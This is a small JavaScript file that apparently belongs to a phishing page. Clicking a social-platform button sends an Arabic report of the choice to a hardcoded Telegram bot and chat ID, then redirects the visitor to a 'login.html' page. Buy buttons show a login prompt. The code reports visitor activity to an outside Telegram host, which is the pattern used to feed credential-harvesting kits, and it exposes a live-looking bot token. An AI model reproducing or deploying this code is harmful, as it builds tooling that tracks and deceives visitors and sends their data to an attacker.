function sendToBot(message) {
    const botToken = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E";
    const chatId = "5375214810";
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Message sent successfully");
            } else {
                console.log("Failed to send message");
            }
        })
        .catch(error => console.error('Error sending message to bot:', error));
}

document.querySelectorAll(".social-item").forEach(item => {
    item.addEventListener("click", function() {
        let socialPlatform = this.querySelector("span").textContent;
        sendToBot(`المستخدم دخل من قسم🚩🦅 ${socialPlatform}`);
        window.location.href = "login.html";
    });
});

document.querySelectorAll(".buy-btn").forEach(button => {
    button.addEventListener("click", function() {
        let loginMessage = document.getElementById("login-warning");
        loginMessage.style.display = "block";
    });
});
